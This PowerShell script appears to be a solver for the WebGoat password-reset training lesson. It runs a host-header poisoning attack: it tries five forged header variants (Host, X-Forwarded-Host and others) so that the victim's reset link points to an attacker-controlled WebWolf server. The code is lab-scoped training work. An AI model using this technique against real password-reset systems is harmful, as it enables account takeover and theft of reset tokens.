# ============================================================
# WebGoat Password Reset - Alternative Headers Attack
# ============================================================
# Try multiple header manipulation techniques
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$webWolfUrl = "http://192.168.254.112:8002"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Host Header Manipulation - All Methods" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

$body = "email=tom@webgoat-cloud.org"

# Method 1: Host header
Write-Host "[Method 1] Using Host header..." -ForegroundColor Yellow
$headers1 = @{
    "Host" = "192.168.254.112:8002"
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link" `
        -Method POST `
        -Headers $headers1 `
        -Body $body `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    Write-Host "  Result: $($result.feedback)" -ForegroundColor White
    if ($result.lessonCompleted) { Write-Host "  [SUCCESS!]" -ForegroundColor Green }
} catch {
    Write-Host "  Failed: $_" -ForegroundColor Red
}

Write-Host ""

# Method 2: X-Forwarded-Host header
Write-Host "[Method 2] Using X-Forwarded-Host header..." -ForegroundColor Yellow
$headers2 = @{
    "X-Forwarded-Host" = "192.168.254.112:8002"
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link" `
        -Method POST `
        -Headers $headers2 `
        -Body $body `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    Write-Host "  Result: $($result.feedback)" -ForegroundColor White
    if ($result.lessonCompleted) { Write-Host "  [SUCCESS!]" -ForegroundColor Green }
} catch {
    Write-Host "  Failed: $_" -ForegroundColor Red
}

Write-Host ""

# Method 3: X-Forwarded-Server header
Write-Host "[Method 3] Using X-Forwarded-Server header..." -ForegroundColor Yellow
$headers3 = @{
    "X-Forwarded-Server" = "192.168.254.112:8002"
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link" `
        -Method POST `
        -Headers $headers3 `
        -Body $body `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    Write-Host "  Result: $($result.feedback)" -ForegroundColor White
    if ($result.lessonCompleted) { Write-Host "  [SUCCESS!]" -ForegroundColor Green }
} catch {
    Write-Host "  Failed: $_" -ForegroundColor Red
}

Write-Host ""

# Method 4: X-Host header
Write-Host "[Method 4] Using X-Host header..." -ForegroundColor Yellow
$headers4 = @{
    "X-Host" = "192.168.254.112:8002"
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link" `
        -Method POST `
        -Headers $headers4 `
        -Body $body `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    Write-Host "  Result: $($result.feedback)" -ForegroundColor White
    if ($result.lessonCompleted) { Write-Host "  [SUCCESS!]" -ForegroundColor Green }
} catch {
    Write-Host "  Failed: $_" -ForegroundColor Red
}

Write-Host ""

# Method 5: Multiple headers combined
Write-Host "[Method 5] Using combined headers..." -ForegroundColor Yellow
$headers5 = @{
    "Host" = "192.168.254.112:8002"
    "X-Forwarded-Host" = "192.168.254.112:8002"
    "X-Forwarded-Server" = "192.168.254.112:8002"
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

try {
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/PasswordReset/ForgotPassword/create-password-reset-link" `
        -Method POST `
        -Headers $headers5 `
        -Body $body `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    Write-Host "  Result: $($result.feedback)" -ForegroundColor White
    if ($result.lessonCompleted) { Write-Host "  [SUCCESS!]" -ForegroundColor Green }
} catch {
    Write-Host "  Failed: $_" -ForegroundColor Red
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Next Steps:" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "1. Check WebWolf now: $webWolfUrl/requests" -ForegroundColor White
Write-Host ""
Write-Host "2. If still no requests, check the WebGoat UI:" -ForegroundColor White
Write-Host "   - There may be a button to 'simulate Tom clicking the link'" -ForegroundColor Gray
Write-Host "   - Look for instructions on the lesson page" -ForegroundColor Gray
Write-Host ""
Write-Host "3. Alternative: Use Burp Suite to intercept the request" -ForegroundColor White
Write-Host "   - See BURP_SUITE_SETUP_GUIDE.txt for instructions" -ForegroundColor Gray
Write-Host ""
